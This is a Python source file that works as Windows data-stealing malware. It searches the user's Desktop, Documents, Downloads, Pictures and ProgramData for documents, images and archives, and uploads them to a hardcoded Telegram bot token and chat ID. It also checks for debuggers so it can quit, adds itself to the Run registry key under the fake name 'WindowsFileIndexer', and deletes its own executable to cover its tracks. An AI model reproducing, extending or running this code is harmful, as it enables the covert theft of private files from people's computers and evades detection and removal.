import os
import sys
import asyncio
from pathlib import Path
from telegram.ext import Application, CommandHandler
import hashlib
import logging
import ctypes
import win32api
import win32con
import shutil

# Setup logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('file_finder.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Bot credentials directly in code
TELEGRAM_TOKEN = "7241747855:AAGhvZbvb9EVxoMSeZbnphCDR_lR7UqgS_Q"  #  bot token
CHAT_ID = "1254510341"  #     chat id 
# Important Windows locations to search
IMPORTANT_LOCATIONS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Pictures"),
    "C:/Users/Public/Documents",
    "C:/ProgramData"
]

# File types to search for
TARGET_FILES = ('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.zip', '.rar')

async def find_and_send_files(bot):
    """Find and send files to Telegram"""
    files_sent = 0
    
    for location in IMPORTANT_LOCATIONS:
        if os.path.exists(location):
            for root, dirs, files in os.walk(location):
                for file in files:
                    if file.lower().endswith(TARGET_FILES):
                        file_path = os.path.join(root, file)
                        try:
                            # Check file size (max 50MB for Telegram)
                            if os.path.getsize(file_path) < 50 * 1024 * 1024:
                                with open(file_path, 'rb') as f:
                                    await bot.send_document(
                                        chat_id=CHAT_ID,
                                        document=f,
                                        caption=f"Found: {file_path}"
                                    )
                                    files_sent += 1
                                    logger.info(f"Sent file: {file_path}")
                        except Exception as e:
                            logger.error(f"Error sending {file_path}: {str(e)}")
    
    # Send summary
    await bot.send_message(
        chat_id=CHAT_ID,
        text=f"Search completed. Total files sent: {files_sent}"
    )

async def start(update, context):
    """Start command handler"""
    await update.message.reply_text("Starting file search...")
    await find_and_send_files(context.bot)
    await update.message.reply_text("File search completed!")

def security_checks():
    """Perform security checks"""
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit("Security check failed")
    if hasattr(sys, 'real_prefix'):
        sys.exit("Security check failed")

def install_persistence():
    """Install persistence"""
    try:
        key = win32api.RegOpenKey(
            win32con.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, 
            win32con.KEY_SET_VALUE
        )
        win32api.RegSetValueEx(
            key,
            "WindowsFileIndexer",
            0,
            win32con.REG_SZ,
            sys.executable
        )
        win32api.RegCloseKey(key)
    except Exception as e:
        logger.error(f"Persistence failed: {str(e)}")

def clean_traces():
    """Clean execution traces"""
    if hasattr(sys, '_MEIPASS'):
        shutil.rmtree(sys._MEIPASS, ignore_errors=True)
    try:
        os.remove(sys.argv[0])
    except Exception as e:
        logger.error(f"Cleanup failed: {str(e)}")

class Main:
    def __init__(self):
        """Initialize the application"""
        self.app = None

    async def run(self):
        try:
            self.app = Application.builder().token(TELEGRAM_TOKEN).build()
            self.app.add_handler(CommandHandler('start', start))
            await self.app.initialize()
            await self.app.start()
            await find_and_send_files(self.app.bot)
        except Exception as e:
            logger.error(f"Error: {str(e)}")
        finally:
            if self.app:
                await self.app.stop()
                await self.app.shutdown()

    async def start(self, update, context):
        """Start command handler"""
        await update.message.reply_text("Starting file search...")
        await find_and_send_files(self.app.bot)
        await update.message.reply_text("File search completed!")

if __name__ == "__main__":
    main = Main()
    security_checks()
    install_persistence()
    asyncio.run(main.run())
    clean_traces()
